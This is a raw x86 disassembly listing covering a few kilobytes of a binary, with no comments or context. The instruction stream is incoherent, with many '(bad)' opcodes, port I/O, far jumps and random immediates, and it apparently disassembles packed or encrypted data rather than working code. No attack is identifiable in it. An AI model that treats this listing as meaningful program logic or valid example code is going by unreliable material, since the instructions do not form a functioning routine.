  48d4f2:	xlat   BYTE PTR ds:[ebx]
  48d4f3:	xor    BYTE PTR cs:[ecx+0x4287ff5b],dh
  48d4fa:	push   ss
  48d4fb:	xchg   ebp,eax
  48d4fc:	mov    al,0x4d
  48d4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d4ff:	das    
  48d500:	(bad)  
  48d501:	or     eax,0x7f9b203a
  48d506:	xor    ch,BYTE PTR [ecx+0x7d]
  48d509:	and    DWORD PTR ds:0xbe1ddfaf,eax
  48d50f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d510:	sar    edi,0xd3
  48d513:	daa    
  48d514:	inc    ebp
  48d515:	xchg   BYTE PTR [ebp+0x20],cl
  48d518:	es jg  0x48d552
  48d51b:	test   al,0x4b
  48d51d:	add    esp,DWORD PTR [ecx]
  48d51f:	neg    DWORD PTR [eax]
  48d521:	xor    eax,0x3587a15c
  48d526:	aas    
  48d527:	push   cs
  48d528:	or     esp,DWORD PTR [edx-0x77]
  48d52b:	test   esi,0x936d1873
  48d531:	pandn  mm6,QWORD PTR [ebx]
  48d534:	push   cs
  48d535:	or     bl,ch
  48d537:	xor    al,0x80
  48d539:	aaa    
  48d53a:	xchg   esi,eax
  48d53b:	arpl   ax,bx
  48d53d:	neg    DWORD PTR fs:[edi+0x32]
  48d541:	jmp    0x48d5a4
  48d543:	and    ebx,DWORD PTR [esi]
  48d545:	aaa    
  48d546:	jmp    FWORD PTR [ebx+0x4d61ab1]
  48d54c:	addr16 daa 
  48d54e:	jbe    0x48d59b
  48d550:	stos   DWORD PTR es:[edi],eax
  48d551:	nop
  48d552:	jg     0x48d5d3
  48d554:	or     eax,0xdf0abb47
  48d559:	xor    esi,DWORD PTR [edi-0x63eac8cd]
  48d55f:	addps  xmm1,XMMWORD PTR [edi-0x15fa00d0]
  48d566:	push   0x6a
  48d568:	jnp    0x48d59d
  48d56a:	fsubr  DWORD PTR [eax+0x21]
  48d56d:	push   eax
  48d56e:	neg    DWORD PTR [edi-0x3d]
  48d571:	cs mov dh,0xd5
  48d574:	dec    edi
  48d575:	pop    ss
  48d576:	out    dx,eax
  48d577:	pop    ss
  48d578:	cmp    BYTE PTR [eax-0x55],cl
  48d57b:	lods   al,BYTE PTR ds:[esi]
  48d57c:	and    eax,0x2c29f0ef
  48d581:	push   ss
  48d582:	iret   
  48d583:	sub    dh,bl
  48d585:	rcpps  xmm3,XMMWORD PTR [esp]
  48d589:	pop    ss
  48d58a:	inc    ebp
  48d58b:	xchg   edi,eax
  48d58c:	add    DWORD PTR [esi+eax*1-0x1f2ae0e8],ecx
  48d593:	push   esi
  48d594:	adc    eax,edi
  48d596:	das    
  48d597:	pop    ds
  48d598:	adc    BYTE PTR [edx+0x7a576065],bh
  48d59e:	pusha  
  48d59f:	lds    eax,FWORD PTR [edi+edi*1+0x71b83c3e]
  48d5a6:	retf   0x2657
  48d5a9:	mov    bh,0x32
  48d5ab:	mov    al,0x86
  48d5ad:	and    DWORD PTR [edi+0x84e0f31],edx
  48d5b3:	aad    0x0
  48d5b5:	fisttp WORD PTR [edx-0x6]
  48d5b8:	jb     0x48d59d
  48d5ba:	xchg   esi,eax
  48d5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d5bc:	aas    
  48d5bd:	mov    bh,0xba
  48d5bf:	push   0x55
  48d5c1:	retf   
  48d5c2:	pop    edi
  48d5c3:	outs   dx,DWORD PTR ds:[esi]
  48d5c4:	xor    DWORD PTR [ecx+eiz*2],ebp
  48d5c7:	push   ebp
  48d5c8:	retf   
  48d5c9:	pop    edi
  48d5ca:	shr    BYTE PTR [edx],1
  48d5cc:	test   al,0x55
  48d5ce:	pop    ds
  48d5cf:	lahf   
  48d5d0:	in     al,0xc9
  48d5d2:	js     0x48d5bf
  48d5d4:	fistp  QWORD PTR [edi+0x690a363e]
  48d5da:	inc    ecx
  48d5db:	mov    cl,0xf7
  48d5dd:	mov    bh,0x84
  48d5df:	xor    al,0x5f
  48d5e1:	shl    BYTE PTR [esi],cl
  48d5e3:	inc    ebx
  48d5e4:	inc    ebx
  48d5e5:	loopne 0x48d624
  48d5e7:	and    eax,0x8f772fae
  48d5ec:	sub    ebx,DWORD PTR [eax+0x64]
  48d5ef:	lods   eax,DWORD PTR ds:[esi]
  48d5f0:	addr16 aas 
  48d5f2:	pop    es
  48d5f3:	dec    ecx
  48d5f4:	loop   0x48d583
  48d5f6:	dec    ebx
  48d5f7:	jg     0x48d5e8
  48d5f9:	cmp    al,0xa5
  48d5fb:	mov    bl,al
  48d5fd:	rcr    DWORD PTR [edi+0x37],cl
  48d600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d601:	jo     0x48d5a3
  48d603:	daa    
  48d604:	(bad)  
  48d606:	sub    BYTE PTR [ebx],0xbc
  48d609:	sub    edi,ebp
  48d60b:	cmp    DWORD PTR [edi+0x4b],ebx
  48d60e:	out    0x7,eax
  48d610:	imul   edi,DWORD PTR [edx+0x40],0xffffff87
  48d614:	lahf   
  48d615:	sahf   
  48d616:	inc    ebx
  48d617:	sub    al,0x22
  48d619:	bound  esp,QWORD PTR ds:0x9eaaad57
  48d61f:	or     BYTE PTR [edi],cl
  48d621:	aas    
  48d622:	test   eax,0x1f7600ed
  48d627:	scas   eax,DWORD PTR es:[edi]
  48d628:	pop    edi
  48d629:	pop    eax
  48d62a:	xlat   BYTE PTR ds:[ebx]
  48d62b:	imul   edx,DWORD PTR [ecx-0x29],0x32
  48d62f:	lar    ebx,WORD PTR [ebp+0x29]
  48d633:	and    eax,0xc745a733
  48d638:	pop    edx
  48d639:	test   BYTE PTR ds:0x454b3fa4,dl
  48d63f:	and    dh,BYTE PTR [eax-0x36884437]
  48d645:	inc    ebx
  48d646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d647:	mov    edi,esi
  48d649:	xor    al,0x0
  48d64b:	aaa    
  48d64c:	test   eax,0x742116a
  48d651:	pop    edi
  48d652:	stos   BYTE PTR es:[edi],al
  48d653:	mov    eax,ds:0xb7338d50
  48d658:	iret   
  48d659:	xor    BYTE PTR [ebp-0x6a183fb5],0x80
  48d660:	mov    al,0xa2
  48d662:	out    0x77,eax
  48d664:	aad    0x34
  48d666:	jmp    0xcf7eadc1
  48d66b:	call   0xdff39c92
  48d670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d671:	inc    esi
  48d672:	pusha  
  48d673:	xor    DWORD PTR [esi+0x61],edx
  48d676:	inc    edi
  48d678:	aam    0x5b
  48d67a:	and    esi,DWORD PTR [ebp-0x37a8a851]
  48d680:	mov    cl,0x89
  48d682:	cmp    bh,0x35
  48d685:	push   edi
  48d686:	ss xchg edx,eax
  48d688:	dec    edx
  48d689:	daa    
  48d68a:	mov    eax,ds:0x9373386
  48d68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d690:	dec    ebx
  48d691:	(bad)  
  48d692:	push   edi
  48d693:	dec    esp
  48d694:	loopne 0x48d616
  48d696:	inc    ebp
  48d697:	pop    DWORD PTR [edx+0x2a317510]
  48d69d:	dec    edi
  48d69e:	arpl   WORD PTR [ebp+0x11],dx
  48d6a1:	pop    ebx
  48d6a2:	push   0xffffffe7
  48d6a4:	out    0x7,eax
  48d6a6:	mov    cl,0x5c
  48d6a8:	ins    DWORD PTR es:[edi],dx
  48d6a9:	and    BYTE PTR [edi],al
  48d6ab:	xor    BYTE PTR [ebx],cl
  48d6ad:	and    al,BYTE PTR [ebx-0x49]
  48d6b0:	ja     0x48d6e8
  48d6b2:	fstp   TBYTE PTR [edx+0x74026ad]
  48d6b8:	sub    esi,DWORD PTR [edi]
  48d6ba:	cmp    DWORD PTR [esi+0x17f74355],eax
  48d6c0:	cmp    DWORD PTR ds:0x872b4a36,esp
  48d6c6:	jecxz  0x48d649
  48d6c8:	push   esi
  48d6c9:	xor    ch,BYTE PTR [edi+edx*2+0x38]
  48d6cd:	push   0x0
  48d6cf:	push   esi
  48d6d0:	or     DWORD PTR [ebp-0x3dac4fd1],0x2d7757e2
  48d6da:	pop    esp
  48d6db:	mov    WORD PTR [edx+0x3a9b3107],es
  48d6e1:	and    al,0xa8
  48d6e3:	das    
  48d6e4:	scas   al,BYTE PTR es:[edi]
  48d6e5:	push   0x1d
  48d6e7:	xor    ah,BYTE PTR [esi-0x7c38c911]
  48d6ed:	mov    ah,0xd4
  48d6ef:	inc    ecx
  48d6f0:	mov    bh,0x27
  48d6f2:	pop    esi
  48d6f3:	sub    al,BYTE PTR [ebp-0x6010b7f2]
  48d6f9:	mov    cl,0x3a
  48d6fb:	sub    eax,0x424f9adc
  48d700:	pushf  
  48d701:	(bad)  
  48d702:	inc    ecx
  48d703:	aas    
  48d704:	inc    ebx
  48d705:	not    DWORD PTR [ecx-0x54]
  48d708:	lea    esi,cs:[edx-0x1]
  48d70c:	scas   eax,DWORD PTR es:[edi]
  48d70d:	shl    BYTE PTR [esi+0x7730cb02],cl
  48d713:	jg     0x48d717
  48d715:	or     ch,BYTE PTR [ebx+0x75a75741]
  48d71b:	fwait
  48d71c:	shl    BYTE PTR ds:0x48758fb2,0x5a
  48d723:	and    DWORD PTR [esi+0x37],esi
  48d726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d727:	sub    ebx,DWORD PTR [ecx]
  48d729:	mov    al,BYTE PTR [edi]
  48d72b:	inc    edx
  48d72c:	ss xchg ecx,eax
  48d72e:	test   eax,0xcfefa104
  48d733:	xchg   ch,dl
  48d735:	or     DWORD PTR [ebx+0x7],ebp
  48d738:	xlat   BYTE PTR ds:[ebx]
  48d739:	xchg   BYTE PTR [ebx+ebx*4+0x76452b95],bh
  48d740:	aaa    
  48d741:	xor    BYTE PTR [esi+0x42],0x8b
  48d745:	aas    
  48d746:	mov    bh,0x20
  48d748:	lock push esi
  48d74a:	sbb    eax,0xeb07f77
  48d74f:	or     BYTE PTR [ebx],ch
  48d751:	(bad)  
  48d752:	lahf   
  48d753:	adc    DWORD PTR [ecx],0x58
  48d756:	pop    es
  48d757:	push   edi
  48d758:	out    0x4,eax
  48d75a:	inc    ebx
  48d75b:	stos   BYTE PTR es:[edi],al
  48d75c:	lods   eax,DWORD PTR ds:[esi]
  48d75d:	xor    al,0xf
  48d75f:	mov    edi,0x8c786ad8
  48d764:	aas    
  48d765:	cmp    DWORD PTR [edi+0x8334697],edi
  48d76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d76c:	dec    edi
  48d76d:	aad    0x62
  48d76f:	cwde   
  48d770:	sub    BYTE PTR [edi],dl
  48d772:	inc    ebp
  48d773:	(bad)  
  48d774:	das    
  48d775:	fisub  DWORD PTR ds:0x474334c7
  48d77b:	cmp    BYTE PTR [edi+edx*2+0x1d],al
  48d77f:	or     BYTE PTR [eax+esi*4],0x83
  48d783:	pop    edi
  48d784:	and    al,0x42
  48d786:	arpl   cx,cx
  48d788:	xor    al,0x4f
  48d78a:	xchg   edx,eax
  48d78b:	nop
  48d78c:	dec    esi
  48d78d:	cmp    eax,0x27e8573b
  48d792:	push   ss
  48d793:	sbb    al,0xef
  48d795:	sub    esi,DWORD PTR [esi]
  48d797:	pop    eax
  48d798:	cmp    ecx,DWORD PTR [edx-0x30cb1852]
  48d79e:	xor    al,0x27
  48d7a0:	sbb    eax,0x3f3aeb17
  48d7a5:	pop    ds
  48d7a6:	ja     0x48d7bb
  48d7a8:	stos   DWORD PTR es:[edi],eax
  48d7a9:	cs mov cl,0x82
  48d7ac:	dec    edi
  48d7ad:	repz xchg edi,eax
  48d7af:	sub    eax,0x43934166
  48d7b4:	(bad)  
  48d7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d7b6:	push   edx
  48d7b7:	inc    ecx
  48d7b8:	jmp    0xcc57:0x55806faf
  48d7bf:	pop    DWORD PTR [ebx+eiz*2+0x8]
  48d7c3:	(bad)  [eax+0x23366794]
  48d7c9:	add    DWORD PTR [edx+ebp*1-0x21],ebx
  48d7cd:	and    ah,BYTE PTR [edi]
  48d7cf:	fadd   DWORD PTR [esi]
  48d7d1:	rol    DWORD PTR [edi+esi*1],0x7
  48d7d5:	ja     0x48d75a
  48d7d7:	mov    ?,WORD PTR [ebp+0xa]
  48d7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d7db:	ucomiss xmm2,DWORD PTR [esp+ecx*4]
  48d7df:	in     al,0x31
  48d7e1:	add    BYTE PTR [edx],dh
  48d7e3:	setbe  BYTE PTR [ebp-0x18454a3c]
  48d7ea:	mov    edi,0x21589015
  48d7ef:	out    dx,eax
  48d7f0:	jg     0x48d844
  48d7f2:	jno    0x48d7fc
  48d7f4:	push   0xba39b6c3
  48d7f9:	pop    edx
  48d7fa:	xlat   BYTE PTR ds:[ebx]
  48d7fb:	bound  esi,QWORD PTR [esi]
  48d7fd:	ja     0x48d866
  48d7ff:	push   ss
  48d800:	leave  
  48d801:	pop    ebp
  48d802:	pop    ss
  48d803:	iret   
  48d804:	mov    bh,0x30
  48d806:	mov    ds:0x1fa3c2da,eax
  48d80b:	ja     0x48d7f8
  48d80d:	lods   eax,DWORD PTR ds:[esi]
  48d80e:	outs   dx,BYTE PTR ds:[esi]
  48d80f:	adc    BYTE PTR [edi+0x4f],dh
  48d812:	push   edx
  48d813:	sub    eax,DWORD PTR [esi]
  48d815:	mov    al,0x9f
  48d817:	das    
  48d818:	pop    eax
  48d819:	aad    0x30
  48d81b:	mov    al,0x9f
  48d81d:	(bad)  
  48d81e:	or     bl,BYTE PTR [edx]
  48d820:	stos   DWORD PTR es:[edi],eax
  48d821:	xchg   edx,eax
  48d822:	lahf   
  48d823:	dec    edi
  48d824:	jo     0x48d86e
  48d826:	sub    esp,esp
  48d828:	cmp    bh,al
  48d82a:	jmp    0x67cf:0x3776b0b2
  48d831:	dec    eax
  48d832:	mov    ecx,0x38b7c408
  48d837:	jecxz  0x48d873
  48d839:	mov    ch,0x46
  48d83b:	push   edi
  48d83c:	xlat   BYTE PTR ds:[ebx]
  48d83d:	xor    DWORD PTR [edx+0x1b],edx
  48d840:	mov    ch,0x6
  48d842:	fist   WORD PTR [edi+0x46295568]
  48d848:	lahf   
  48d849:	aaa    
  48d84a:	pop    ebx
  48d84b:	mov    cl,0x94
  48d84d:	sub    al,BYTE PTR [edi]
  48d84f:	imul   ebx
  48d851:	inc    ecx
  48d852:	lods   al,BYTE PTR ds:[esi]
  48d853:	add    bh,bl
  48d855:	mov    ebx,0xe8e82f39
  48d85a:	nop
  48d85b:	(bad)  
  48d85c:	daa    
  48d85d:	daa    
  48d85e:	xor    ebx,eax
  48d860:	push   0x2
  48d862:	mov    ah,0x57
  48d864:	xchg   edi,ecx
  48d866:	adc    BYTE PTR [eax],dh
  48d868:	inc    ebp
  48d869:	pop    eax
  48d86a:	xlat   BYTE PTR ds:[ebx]
  48d86b:	inc    esi
  48d86c:	lea    ebx,[ecx]
  48d86e:	inc    edx
  48d86f:	push   0x2ae1bfa7
  48d874:	or     BYTE PTR [edi+edx*8-0x4d5fba41],ah
  48d87b:	adc    DWORD PTR [edi+esi*8],0x5458344f
  48d882:	(bad)  
  48d883:	iret   
  48d884:	outs   dx,BYTE PTR ds:[esi]
  48d885:	fs pop eax
  48d887:	mov    ds:0x3257f784,al
  48d88c:	mov    eax,ds:0xc7d022d1
  48d891:	outs   dx,BYTE PTR ds:[esi]
  48d892:	adc    BYTE PTR [edx-0x66],0xa
  48d896:	ja     0x48d8da
  48d898:	mov    bh,0x70
  48d89a:	mov    ah,0x61
  48d89c:	inc    ebp
  48d89d:	outs   dx,DWORD PTR ds:[esi]
  48d89e:	scas   eax,DWORD PTR es:[edi]
  48d89f:	fild   WORD PTR [edx+0x4f]
  48d8a2:	aam    0xb7
  48d8a4:	jmp    0x48d8f5
  48d8a6:	push   esi
  48d8a7:	and    esp,DWORD PTR [ebp-0x6f58a88b]
  48d8ad:	push   ds
  48d8ae:	dec    edx
  48d8af:	sub    eax,DWORD PTR [ebx]
  48d8b1:	pop    ebx
  48d8b2:	inc    esi
  48d8b3:	inc    ecx
  48d8b4:	sub    eax,0x38af2099
  48d8b9:	push   ss
  48d8ba:	test   DWORD PTR [esp+edx*2+0x2ec747b7],ebp
  48d8c1:	sbb    DWORD PTR [ebx],ebp
  48d8c3:	xchg   edi,ecx
  48d8c5:	scas   eax,DWORD PTR es:[edi]
  48d8c6:	stc    
  48d8c7:	mov    al,ds:0xa2376276
  48d8cc:	cmp    BYTE PTR [eax+ecx*1+0x67bf216b],ah
  48d8d3:	adc    BYTE PTR [edi],al
  48d8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d8d6:	add    al,0x4f
  48d8d8:	xor    al,BYTE PTR [eax+0x10]
  48d8db:	fwait
  48d8dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d8dd:	iret   
  48d8de:	inc    ecx
  48d8df:	(bad)  
  48d8e0:	and    eax,0xbfd1c107
  48d8e5:	cmp    BYTE PTR [edi+0x42],dl
  48d8e8:	mov    ds:0xc2603a5b,eax
  48d8ed:	xchg   DWORD PTR [ebx],edx
  48d8ef:	test   DWORD PTR [eax+0x338f3f05],ecx
  48d8f5:	sub    cl,BYTE PTR [ebp+0x430f01a9]
  48d8fb:	ja     0x48d95f
  48d8fd:	imul   ebp,DWORD PTR [ebx+0x40],0xc0417adf
  48d904:	mov    gs,WORD PTR [ebx-0x5468b0ab]
  48d90a:	ds mov cl,0xa6
  48d90d:	or     eax,0xa0b7c72f
  48d912:	xor    BYTE PTR [esi+0x1],dl
  48d915:	ffreep st(7)
  48d917:	rol    DWORD PTR ds:0xbf87c62d,0xec
  48d91e:	pop    eax
  48d91f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d920:	mov    WORD PTR [edi-0x4d5fc5e9],cs
  48d926:	ss aas 
  48d928:	iret   
  48d929:	xor    edx,DWORD PTR [eax+0x21]
  48d92c:	jmp    0x2758:0x3a3fafc2
  48d933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d934:	fbstp  TBYTE PTR [ebx]
  48d936:	sbb    eax,0x97ad35b4
  48d93b:	das    
  48d93c:	addr16 inc edx
  48d93e:	mov    ah,0x90
  48d940:	sbb    ch,BYTE PTR [edi+ebp*1]
  48d943:	mov    al,0xc1
  48d945:	les    ebp,FWORD PTR [edx-0x79]
  48d948:	arpl   WORD PTR [ebx-0x6c],sp
  48d94b:	or     ch,al
  48d94d:	outs   dx,DWORD PTR ds:[esi]
  48d94e:	xchg   edi,eax
  48d94f:	test   al,0x14
  48d951:	mov    ah,0xe
  48d953:	addr16 lahf 
  48d955:	lea    ebx,[ebx]
  48d957:	cmp    ah,al
  48d959:	(bad)  
  48d95a:	jmp    DWORD PTR [ebx+ebp*8+0x18]
  48d95e:	add    eax,0x363644e7
  48d963:	scas   eax,DWORD PTR es:[edi]
  48d964:	push   eax
  48d965:	mov    edi,0x23101f6f
  48d96a:	xchg   ch,al
  48d96c:	(bad)  
  48d96d:	test   BYTE PTR [bp+si+0x856],al
  48d972:	addr16 pop edi
  48d974:	pop    eax
  48d975:	pop    esp
  48d976:	and    dl,BYTE PTR [esi-0x69]
  48d979:	and    cl,cl
  48d97b:	jno    0x48d980
  48d97d:	push   edi
  48d97e:	xor    BYTE PTR [esi-0x26],al
  48d981:	mov    edx,0x415f8720
  48d986:	dec    ebp
  48d987:	sbb    ecx,DWORD PTR [ebp+0x31307727]
  48d98d:	cmp    BYTE PTR [esp+eax*2+0x349ea737],ch
  48d994:	pusha  
  48d995:	add    ch,BYTE PTR [edi]
  48d997:	xchg   ebx,eax
  48d998:	mov    ch,0x1c
  48d99a:	pushf  
  48d99b:	and    al,0x1f
  48d99d:	xor    ah,BYTE PTR [esi-0x607f1dec]
  48d9a3:	mov    ch,0x68
  48d9a5:	xor    BYTE PTR ds:0x76827b6,0x26
  48d9ac:	inc    ebx
  48d9ad:	aaa    
  48d9ae:	xor    ebx,edi
  48d9b0:	mov    cl,0x6b
  48d9b2:	mov    bh,0x36
  48d9b4:	pop    ds
  48d9b5:	(bad)  
  48d9b7:	dec    edx
  48d9b8:	or     eax,0x75f0e26
  48d9bd:	lock pop edx
  48d9bf:	push   ebp
  48d9c0:	sar    DWORD PTR [edi],0x2b
  48d9c3:	popa   
  48d9c4:	mov    al,0x4e
  48d9c6:	mov    BYTE PTR [ebx-0x5e],ch
  48d9c9:	inc    edx
  48d9ca:	mov    cl,0xb1
  48d9cc:	inc    edx
  48d9cd:	push   DWORD PTR [edi-0x51]
  48d9d0:	and    al,0xc7
  48d9d2:	cmp    BYTE PTR [esi],0x37
  48d9d5:	addr16 mov eax,0xaf8a0bbe
  48d9db:	inc    esp
  48d9dc:	inc    edi
  48d9dd:	inc    ecx
  48d9de:	mov    edi,0xd4badbac
  48d9e3:	pop    edi
  48d9e4:	pop    ss
  48d9e5:	mov    eax,ds:0x6774d483
  48d9ea:	inc    esi
  48d9eb:	jg     0x48da3e
  48d9ed:	mov    BYTE PTR [eax],ah
  48d9ef:	push   ebp
  48d9f0:	aaa    
  48d9f1:	ja     0x48d9f2
  48d9f3:	or     dl,BYTE PTR [esi-0x3f]
  48d9f6:	ret    0x7f0f
  48d9f9:	mov    bh,0x82
  48d9fb:	(bad)  
  48d9fc:	(bad)  
  48d9fd:	(bad)  
  48d9fe:	movq   mm6,QWORD PTR [esi-0x587fd749]
  48da05:	out    dx,eax
  48da06:	ja     0x48d9ea
  48da08:	(bad)  
  48da09:	sar    DWORD PTR [edx],cl
  48da0b:	pop    ss
  48da0c:	mov    ebx,0x456e369f
  48da11:	sar    bh,1
  48da13:	push   ss
  48da14:	dec    ecx
  48da15:	add    BYTE PTR [ebx+0x14],dl
  48da18:	pop    edi
  48da19:	xor    edx,DWORD PTR [eax]
  48da1b:	or     DWORD PTR [eax],0xffffffc5
  48da1e:	(bad)  
  48da1f:	dec    edi
  48da20:	mov    dl,0xcc
  48da22:	push   ebp
  48da23:	push   0x2b
  48da25:	inc    ebp
  48da26:	(bad)  
  48da27:	and    al,0xe9
  48da29:	push   0xffffffcf
  48da2b:	xor    al,BYTE PTR [edi+0x2b82b74]
  48da31:	ja     0x48da5a
  48da33:	push   es
  48da34:	lds    esi,FWORD PTR [esi+edx*2]
  48da37:	and    eax,edi
  48da39:	jmp    DWORD PTR [ecx-0x489d9eab]
  48da3f:	lods   eax,DWORD PTR ds:[esi]
  48da40:	push   edx
  48da41:	ror    BYTE PTR [edx],1
  48da43:	lahf   
  48da44:	inc    esp
  48da46:	stos   BYTE PTR es:[edi],al
  48da47:	mov    ch,0x4a
  48da49:	xorps  xmm4,XMMWORD PTR [ebx]
  48da4c:	mov    ah,0x65
  48da4e:	jmp    0xafa7e97a
  48da53:	or     al,0xb8
  48da55:	add    eax,0x13373543
  48da5a:	adc    BYTE PTR [eax],al
  48da5c:	scas   al,BYTE PTR es:[edi]
  48da5d:	or     al,BYTE PTR [edi-0x53e77ac8]
  48da63:	mov    eax,ds:0xb6af324f
  48da68:	fdivr  QWORD PTR [edx]
  48da6a:	fs (bad) 
  48da6c:	mov    ebx,0x955c4c38
  48da71:	sysenter 
  48da73:	das    
  48da74:	or     ch,bl
  48da76:	mov    al,ds:0x64573426
  48da7b:	xor    DWORD PTR [edx-0x7f],eax
  48da7e:	dec    ebx
  48da7f:	pop    ebx
  48da80:	push   0x4f33560b
  48da85:	pop    es
  48da86:	xchg   edi,eax
  48da87:	xor    al,0x30
  48da89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48da8a:	mov    dh,0x6f
  48da8c:	outs   dx,DWORD PTR ds:[esi]
  48da8d:	inc    ecx
  48da8e:	sub    DWORD PTR [eax+0x7a5fc16e],edx
  48da94:	inc    esi
  48da95:	inc    ecx
  48da96:	pop    ecx
  48da97:	dec    edx
  48da98:	inc    ebp
  48da99:	add    ah,BYTE PTR [edi-0x74ac9552]
  48da9f:	(bad)  
  48daa1:	cmp    DWORD PTR [edx+0x172142d6],ebp
  48daa7:	inc    edi
  48daa8:	addr16 dec ebx
  48daaa:	add    bl,BYTE PTR [edi-0x3c]
  48daad:	mov    bh,0xe3
  48daaf:	add    DWORD PTR [esi+0x439786b7],0x55c2db97
  48dab9:	add    ebp,DWORD PTR [edi+0x64913432]
  48dabf:	mov    al,BYTE PTR [edi-0x1f9ec7bd]
  48dac5:	and    bh,dh
  48dac7:	ss aaa 
  48dac9:	pop    eax
  48daca:	mov    al,0x1b
  48dacc:	and    DWORD PTR [edi-0x49],0x58ade277
  48dad3:	pop    ss
  48dad4:	out    0x37,eax
  48dad6:	aaa    
  48dad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48dad8:	push   cs
  48dad9:	and    DWORD PTR cs:[edi],esi
  48dadc:	scas   al,BYTE PTR es:[edi]
  48dadd:	div    DWORD PTR [edi]
  48dadf:	lock xchg edx,eax
  48dae1:	dec    esp
  48dae2:	inc    ecx
  48dae3:	push   edi
  48dae4:	iret   
  48dae5:	mov    ah,0x26
  48dae7:	push   es
  48dae8:	push   0x4d624637
  48daed:	or     BYTE PTR [ebp-0x7a96f0b9],cl
  48daf3:	fmul   DWORD PTR [edi+ebp*2]
  48daf6:	xchg   DWORD PTR [esi-0x58],eax
  48daf9:	and    al,0x17
  48dafb:	jg     0x48db2f
  48dafd:	pop    ss
  48dafe:	pop    edx
  48daff:	ret    
  48db00:	adc    al,0xf
  48db03:	pop    ss
  48db04:	push   edi
  48db05:	mov    DWORD PTR [edx+0x32e70dc4],ecx
  48db0b:	dec    edi
  48db0c:	cmp    eax,0x3f030a2c
  48db11:	mov    eax,0x7f42902a
  48db17:	push   edi
  48db18:	shl    BYTE PTR [esi],0xad
  48db1b:	xchg   ebx,eax
  48db1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48db1d:	(bad)  
  48db1e:	sbb    bl,al
  48db20:	mov    ah,0x90
  48db22:	aaa    
  48db23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48db24:	pop    edx
  48db25:	pop    ebx
  48db26:	mov    cl,0xa
  48db28:	pfcmpgt mm6,QWORD PTR [edi]
  48db2c:	dec    ebx
  48db2d:	xor    al,0x93
  48db2f:	inc    edi
  48db30:	push   esi
  48db31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48db32:	push   ss
  48db33:	pop    edx
  48db34:	stos   DWORD PTR es:[edi],eax
  48db35:	jmp    edi
  48db37:	shld   DWORD PTR [ecx+eax*1+0x836d658],esp,cl
  48db3f:	test   eax,edi
  48db41:	shl    BYTE PTR [esi+0x67],cl
  48db44:	xchg   DWORD PTR [ecx-0x787488dc],ebp
  48db4a:	cmp    DWORD PTR [edx],ebp
  48db4c:	or     DWORD PTR [ecx+esi*1-0x39],ebx
  48db50:	inc    edx
  48db51:	fist   WORD PTR [esi+0x0]
  48db54:	and    DWORD PTR [ecx],ebx
  48db56:	inc    ebx
  48db57:	pop    ds
  48db58:	mov    bh,0x80
  48db5a:	fst    DWORD PTR [edx]
  48db5c:	das    
  48db5d:	xchg   edx,eax
  48db5e:	adc    dh,BYTE PTR [eax+0x4f70246]
  48db64:	and    al,BYTE PTR [edx]
  48db66:	or     eax,0x56b6c7cf
  48db6b:	adc    dl,BYTE PTR [edi]
  48db6d:	xor    al,0xe3
  48db6f:	and    BYTE PTR [ebp+0xfafd561],ch
  48db75:	sub    al,BYTE PTR [edx+0x1b]
  48db78:	cmp    esp,DWORD PTR [edi]
  48db7a:	mov    bh,0x48
  48db7c:	int    0x96
  48db7e:	fimul  WORD PTR [ebx-0x51]
  48db81:	lods   al,BYTE PTR ds:[esi]
  48db82:	dec    esi
  48db83:	add    ch,BYTE PTR [ebx]
  48db85:	aaa    
  48db86:	xlat   BYTE PTR ds:[ebx]
  48db87:	xchg   ebp,eax
  48db88:	inc    esi
  48db89:	mov    dl,BYTE PTR [esi+0x73]
  48db8c:	daa    
  48db8d:	sub    ebp,DWORD PTR [bx+di]
  48db90:	shl    BYTE PTR [edx+0x33],1
  48db93:	xor    DWORD PTR ss:[ecx-0x4f],eax
  48db97:	add    al,BYTE PTR es:[edi-0x29]
  48db9b:	mov    esi,DWORD PTR [ebp+0x1b]
  48db9e:	mov    eax,ds:0xd54fc6cf
  48dba3:	ins    DWORD PTR es:[edi],dx
  48dba4:	loop   0x48dba9
  48dba6:	pop    edi
  48dba7:	inc    edi
  48dba8:	sbb    eax,0x2fa43153
  48dbad:	ss stos DWORD PTR es:[edi],eax
  48dbaf:	mov    eax,ds:0xcf882b00
  48dbb4:	scas   eax,DWORD PTR es:[edi]
  48dbb5:	shl    BYTE PTR [eax],cl
  48dbb7:	int3   
  48dbb8:	xchg   esi,eax
  48dbb9:	ss aas 
  48dbbb:	xor    al,bh
  48dbbd:	mov    ebp,0x7b6eac1
  48dbc2:	cli    
  48dbc3:	dec    ebx
  48dbc4:	push   0xffffffa0
  48dbc6:	test   BYTE PTR [ebx],ah
  48dbc8:	neg    edi
  48dbca:	mov    DWORD PTR [edi+0x6a],esp
  48dbcd:	lds    edx,FWORD PTR [edi+0x2b]
  48dbd0:	add    BYTE PTR [ebp-0x88f54a],cl
  48dbd6:	add    bh,BYTE PTR [eax+0x7f5f08c4]
  48dbdc:	add    ebx,DWORD PTR [esi+0x3]
  48dbdf:	outs   dx,BYTE PTR ds:[esi]
  48dbe0:	xlat   BYTE PTR ds:[ebx]
  48dbe1:	push   cs
  48dbe2:	xchg   DWORD PTR ds:0x27529819,esi
  48dbe8:	xor    ebx,DWORD PTR [edx]
  48dbea:	test   DWORD PTR [edx+0x708f7b2e],edx
